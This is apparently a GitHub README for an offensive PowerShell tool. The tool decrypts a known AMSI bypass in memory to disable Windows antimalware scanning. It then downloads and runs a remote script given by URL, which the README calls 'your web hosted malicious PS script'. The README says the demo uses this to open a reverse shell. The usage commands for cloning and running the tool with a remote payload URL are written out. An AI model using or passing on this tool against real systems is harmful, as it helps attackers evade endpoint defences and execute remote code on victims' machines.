# AMSIReflectionCrypt
Forcing AMSI Fail by Decrypting 'Matt Graebers one-liner AMSI bypass' in memory [AES-128]
and invoke PowerShell command execution from remote scripts after AMSI is bypassed.

in the example shown, the bypass is used to Invoke a reverse shell after AMSI is bypassed:

![ezgif com-resize (2)](https://user-images.githubusercontent.com/91469978/229790638-09003b42-08cd-4a4f-9a43-db74ee5ff4e9.gif)

# Usage
```
  git clone https://github.com/M0M3NTUM44/AMSIReflectionCrypt.git
  cd AMSIReflectionCrypt
  .\AMSIReflectionCrypt.ps1 -h
```
  -ts  Invoke the TestScript.ps1 from GitHub.
```
.\AMSIReflectionCrypt.ps1 -ts
```
  -u   Full path to your web hosted malicious PS script (Default - TestScript.ps1 from GitHub).
```
.\AMSIReflectionCrypt.ps1 -u https://PATH/TO/script.ps1
```
The TestScript.ps1 file simply types "amsiutils" (flagged string) to the terminal to test if AMSI detection was Bypassed.

# Credits & Resources
*https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
*https://twitter.com/mattifestation
